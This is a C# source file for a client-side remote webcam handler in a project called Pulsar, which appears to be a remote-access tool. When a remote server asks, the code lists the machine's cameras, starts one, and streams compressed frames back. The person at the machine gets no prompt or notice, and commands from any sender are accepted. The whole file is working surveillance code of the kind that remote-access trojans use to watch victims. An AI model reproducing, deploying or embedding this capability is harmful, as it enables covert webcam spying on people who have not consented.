using Pulsar.Client.Helper;
using Pulsar.Common.Enums;
using Pulsar.Common.Networking;
using Pulsar.Common.Video;
using Pulsar.Common.Video.Codecs;
using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Threading;
using System.Diagnostics;
using Pulsar.Common.Messages.Webcam;
using Pulsar.Common.Messages.Other;
using System.Collections.Concurrent;

namespace Pulsar.Client.Messages
{
    public class RemoteWebcamHandler : NotificationMessageProcessor, IDisposable
    {
        private UnsafeStreamCodec _streamCodec;
        private BitmapData _webcamData = null;
        private Bitmap _webcam = null;
        private ISender _clientMain;
        private Thread _captureThread;
        private readonly WebcamHelper _webcamHelper = new WebcamHelper();

        private CancellationTokenSource _cancellationTokenSource;

        // frame control variables
        private readonly ConcurrentQueue<byte[]> _frameBuffer = new ConcurrentQueue<byte[]>();
        private readonly AutoResetEvent _frameRequestEvent = new AutoResetEvent(false);
        private int _pendingFrameRequests = 0;

        // max buffer size to prevent memory issues
        private const int MAX_BUFFER_SIZE = 10;

        private readonly Stopwatch _stopwatch = new Stopwatch();
        private int _frameCount = 0;
        private float _lastFrameRate = 0f;
        private bool _sendFrameRateNext = false;

        public override bool CanExecute(IMessage message) => message is GetWebcam ||
                                                             message is GetAvailableWebcams;

        public override bool CanExecuteFrom(ISender sender) => true;

        public override void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case GetWebcam msg:
                    Execute(sender, msg);
                    break;
                case GetAvailableWebcams msg:
                    Execute(sender, msg);
                    break;
            }
        }

        private void Execute(ISender client, GetWebcam message)
        {
            if (message.Status == RemoteWebcamStatus.Stop)
            {
                StopWebcamStreaming();
            }
            else if (message.Status == RemoteWebcamStatus.Start)
            {
                StartWebcamStreaming(client, message);
            }
            else if (message.Status == RemoteWebcamStatus.Continue)
            {
                // server is requesting more frames
                Interlocked.Add(ref _pendingFrameRequests, message.FramesRequested);
                _frameRequestEvent.Set();
            }
        }

        private void StartWebcamStreaming(ISender client, GetWebcam message)
        {
            try
            {
                try
                {
                    _webcamHelper.StartWebcam(message.DisplayIndex);
                }
                catch (Exception ex)
                {
                    Debug.WriteLine($"Error starting webcam: {ex.Message}");
                    OnReport("Failed to start webcam: " + ex.Message);
                    return;
                }
                Debug.WriteLine("Starting remote webcam session");

                var webcamBounds = _webcamHelper.GetBounds();
                var resolution = new Resolution { Height = webcamBounds.Height, Width = webcamBounds.Width };

                try
                {
                    if (_streamCodec == null)
                        _streamCodec = new UnsafeStreamCodec(message.Quality, message.DisplayIndex, resolution);

                    if (message.CreateNew)
                    {
                        _streamCodec?.Dispose();
                        _streamCodec = new UnsafeStreamCodec(message.Quality, message.DisplayIndex, resolution);
                        OnReport("Remote webcam session started");
                    }

                    if (_streamCodec.ImageQuality != message.Quality || _streamCodec.Monitor != message.DisplayIndex || _streamCodec.Resolution != resolution)
                    {
                        _streamCodec?.Dispose();
                        _streamCodec = new UnsafeStreamCodec(message.Quality, message.DisplayIndex, resolution);
                    }
                }
                catch (Exception ex)
                {
                    Debug.WriteLine($"Error initializing stream codec: {ex.Message}");
                    OnReport("Failed to initialize stream codec: " + ex.Message);
                    return;
                }

                _clientMain = client;

                // clear any pending frame requests and existing frames
                ClearFrameBuffer();
                Interlocked.Exchange(ref _pendingFrameRequests, message.FramesRequested);

                if (_captureThread == null || !_captureThread.IsAlive)
                {
                    try
                    {
                        _cancellationTokenSource = new CancellationTokenSource();
                        _captureThread = new Thread(() => BufferedCaptureLoop(_cancellationTokenSource.Token));
                        _captureThread.Start();
                    }
                    catch (Exception ex)
                    {
                        Debug.WriteLine($"Error starting capture thread: {ex.Message}");
                        OnReport("Failed to start capture thread: " + ex.Message);
                    }
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Unexpected error in StartWebcamStreaming: {ex.Message}");
                OnReport("Unexpected error: " + ex.Message);
            }
        }

        private void StopWebcamStreaming()
        {
            try
            {
                try
                {
                    _webcamHelper.StopWebcam();
                }
                catch (Exception ex)
                {
                    Debug.WriteLine($"Error stopping webcam: {ex.Message}");
                }
                Debug.WriteLine("Stopping remote webcam session");

                _cancellationTokenSource?.Cancel();

                if (_captureThread != null && _captureThread.IsAlive)
                {
                    try
                    {
                        _frameRequestEvent.Set(); // wake up thread
                        _captureThread.Join();
                    }
                    catch (Exception ex)
                    {
                        Debug.WriteLine($"Error joining capture thread: {ex.Message}");
                    }
                    _captureThread = null;
                }

                if (_webcam != null)
                {
                    if (_webcamData != null)
                    {
                        try
                        {
                            _webcam.UnlockBits(_webcamData);
                        }
                        catch (Exception ex)
                        {
                            Debug.WriteLine($"Error unlocking bits: {ex.Message}");
                        }
                        _webcamData = null;
                    }
                    try
                    {
                        _webcam.Dispose();
                    }
                    catch (Exception ex)
                    {
                        Debug.WriteLine($"Error disposing webcam: {ex.Message}");
                    }
                    _webcam = null;
                }

                if (_streamCodec != null)
                {
                    try
                    {
                        _streamCodec.Dispose();
                    }
                    catch (Exception ex)
                    {
                        Debug.WriteLine($"Error disposing stream codec: {ex.Message}");
                    }
                    _streamCodec = null;
                }

                // clear the buffer
                ClearFrameBuffer();
                Interlocked.Exchange(ref _pendingFrameRequests, 0);
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Unexpected error in StopWebcamStreaming: {ex.Message}");
            }
        }

        private void BufferedCaptureLoop(CancellationToken cancellationToken)
        {
            Debug.WriteLine("Starting buffered capture loop");
            _stopwatch.Start();

            while (!cancellationToken.IsCancellationRequested)
            {
                try
                {
                    // wait for frame requests if the buffer is full or no frames are requested
                    if (_frameBuffer.Count >= MAX_BUFFER_SIZE || _pendingFrameRequests <= 0)
                    {
                        Debug.WriteLine($"Waiting for frame requests. Buffer size: {_frameBuffer.Count}, Pending requests: {_pendingFrameRequests}");
                        _frameRequestEvent.WaitOne(500);

                        // if cancellation was requested during the wait
                        if (cancellationToken.IsCancellationRequested)
                            break;

                        continue;
                    }

                    // capture frame and add to buffer
                    byte[] frameData = CaptureFrame();
                    if (frameData != null)
                    {
                        _frameBuffer.Enqueue(frameData);

                        // increment frame counter for statistics
                        _frameCount++;
                        if (_stopwatch.ElapsedMilliseconds >= 1000)
                        {
                            Debug.WriteLine($"Capture FPS: {_frameCount}, Buffer size: {_frameBuffer.Count}, Pending requests: {_pendingFrameRequests}");
                            _lastFrameRate = _frameCount;
                            _frameCount = 0;
                            _stopwatch.Restart();
                            _sendFrameRateNext = true;
                        }
                    }

                    // send frames if we have pending requests
                    while (_pendingFrameRequests > 0 && _frameBuffer.TryDequeue(out byte[] frameToSend))
                    {
                        SendFrameToServer(frameToSend, Interlocked.Decrement(ref _pendingFrameRequests) == 0);
                    }
                }
                catch (Exception ex)
                {
                    Debug.WriteLine($"Error in buffered capture loop: {ex.Message}");
                    Thread.Sleep(100); // Avoid tight loop in case of repeated errors
                }
            }

            Debug.WriteLine("Buffered capture loop ended");
        }

        private byte[] CaptureFrame()
        {
            try
            {
                _webcam = _webcamHelper.GetLatestFrame();

                if (_webcam == null)
                {
                    return null;
                }

                _webcamData = _webcam.LockBits(new Rectangle(0, 0, _webcam.Width, _webcam.Height),
                    ImageLockMode.ReadWrite, _webcam.PixelFormat);

                using (MemoryStream stream = new MemoryStream())
                {
                    if (_streamCodec == null) throw new Exception("StreamCodec can not be null.");
                    _streamCodec.CodeImage(_webcamData.Scan0,
                        new Rectangle(0, 0, _webcam.Width, _webcam.Height),
                        new Size(_webcam.Width, _webcam.Height),
                        _webcam.PixelFormat, stream);

                    return stream.ToArray();
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Error capturing frame: {ex.Message}");
                return null;
            }
            finally
            {
                if (_webcamData != null)
                {
                    _webcam.UnlockBits(_webcamData);
                    _webcamData = null;
                }
                _webcam?.Dispose();
                _webcam = null;
            }
        }
        
        private void SendFrameToServer(byte[] frameData, bool isLastRequestedFrame)
        {
            if (frameData == null || _clientMain == null) return;

            try
            {
                var response = new GetWebcamResponse
                {
                    Image = frameData,
                    Quality = _streamCodec.ImageQuality,
                    Monitor = _streamCodec.Monitor,
                    Resolution = _streamCodec.Resolution,
                    IsLastRequestedFrame = isLastRequestedFrame,
                    FrameRate = 0f
                };

                if (_sendFrameRateNext)
                {
                    response.FrameRate = _lastFrameRate;
                    _sendFrameRateNext = false;
                }

                _clientMain.Send(response);
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Error sending frame to server: {ex.Message}");
            }
        }

        private void ClearFrameBuffer()
        {
            while (_frameBuffer.TryDequeue(out _)) { }
        }

        private void Execute(ISender client, GetAvailableWebcams message)
        {
            client.Send(new GetAvailableWebcamsResponse { Webcams = _webcamHelper.GetWebcams() });
        }

        /// <summary>
        /// Disposes all managed and unmanaged resources associated with this message processor.
        /// </summary>
        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (disposing)
            {
                StopWebcamStreaming();
                _streamCodec?.Dispose();
                _cancellationTokenSource?.Dispose();
                _frameRequestEvent?.Dispose();
            }
        }
    }
}
